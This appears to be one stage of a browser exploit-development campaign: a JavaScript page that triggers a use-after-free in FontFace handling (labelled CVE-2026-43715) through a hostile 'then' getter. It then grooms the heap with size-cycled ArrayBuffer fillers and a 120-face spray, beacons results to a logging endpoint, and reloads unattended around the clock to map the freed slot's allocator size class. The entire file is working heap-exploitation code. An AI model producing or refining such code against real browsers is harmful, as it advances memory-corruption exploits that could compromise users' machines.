// p458 — CVE-2026-43715 Stage 2: heap class-map of the freed slot
// (AUTO-RELOAD LOOP — designed to run unattended 24/7)
// Beacon prefix: V458-
//
// Question this answers: what allocation size class does the freed
// FontFace wrapper slot live in? p446 showed raw ArrayBuffer bytes CAN
// claim the slot (dispatch death) — so a size-matched ArrayBuffer
// backing store and the wrapper share a FastMalloc class.
//
// Method: per run, insert exactly ONE filler allocation of size k
// between the free and the face spray (LIFO free list: a same-class
// first allocation claims the block). If flips survive -> k is outside
// the wrapper class. If the page dies -> the last K-GO beacon names
// the killer size = the wrapper's class. Sizes cycle via localStorage
// so a crash round doesn't lose the schedule on re-park.
//
// k=0 rounds are the p457 baseline (no filler) — they keep feeding the
// flip-position distribution.
(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V458-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  // v458b: dense sweep, 8-byte granularity to 256. Rationale: no killer
  // size at 16..128 (182 runs) — wrapper class is >128 or the ArrayBuffer
  // bookkeeping header lifts each filler one class up, so dense coverage
  // is needed to catch the true class under any header offset.
  var SIZES = [0];
  for (var _i = 8; _i <= 256; _i += 8) SIZES.push(_i);

  var k;
  try { k = parseInt(localStorage.getItem('p458k') || '0', 10) || 0; } catch(e) { k = 0; }
  var next = (SIZES.indexOf(k) + 1) % SIZES.length;
  try { localStorage.setItem('p458k', String(SIZES[next])); } catch(e) {}

  B('BOOT-k' + k);

  window.onerror = function(msg) {
    B('ONERROR-' + encodeURIComponent(String(msg)).slice(0, 80));
    return false;
  };

  var OK = 'local(Helvetica)';
  var BAD = 'local(Songti)';
  var jfaces = [];

  Object.defineProperty(FontFace.prototype, 'then', {
    get: function() {
      var v = document.getElementById('v');
      if (v) {
        v.remove();
        document.body.offsetHeight;      // free happens here
        if (k > 0) {
          // one filler, exactly matching-size class candidates first:
          // LIFO means the first same-class allocation takes the slot.
          window.__filler = new ArrayBuffer(k);
        }
        for (var j = 0; j < 120; j++) {
          var ff = new FontFace('j' + j, BAD);
          document.fonts.add(ff);
          jfaces.push(ff);
        }
      }
      return undefined;
    },
    configurable: true
  });

  function findFace(fam) {
    var found = null;
    document.fonts.forEach(function(f) {
      if (f.family.replace(/['"]/g, '') === fam) found = f;
    });
    return found;
  }

  function round0() {
    B('K' + k + '-GO');
    var victim = document.createElement('style');
    victim.id = 'v';
    victim.textContent = 'x{}';
    document.head.appendChild(victim);

    var fs = document.createElement('style');
    fs.textContent = '@font-face { font-family: g0; src: ' + OK + '; }';
    document.head.appendChild(fs);
    document.body.offsetHeight;

    var face = findFace('g0');
    if (!face) { B('NOFACE-RELOAD'); setTimeout(reload, 2000); return; }

    void face.loaded;
    face.load().then(
      function() {
        var flipped = -1, others = 0;
        for (var j = 0; j < jfaces.length; j++) {
          var s;
          try { s = jfaces[j].status; } catch(e) { s = 'THROW'; }
          if (s === 'loaded') { flipped = j; }
          else if (s !== 'unloaded') { others++; }
        }
        B('F' + k + '-' + (flipped >= 0 ? 'FLIPPOS-' + flipped : 'NOFLIP'));
        if (others) B('F' + k + '-ODDSTAT-' + others);
        setTimeout(reload, 2500);
      },
      function(e) { B('K' + k + '-NO-0-RELOAD'); setTimeout(reload, 2000); }
    );
  }

  function reload() {
    location.replace('fa-v458-classmap.html?r=' + Date.now());
  }

  round0();
  setTimeout(function() {
    B('WATCHDOG-RELOAD-k' + k);
    reload();
  }, 30000);
})();
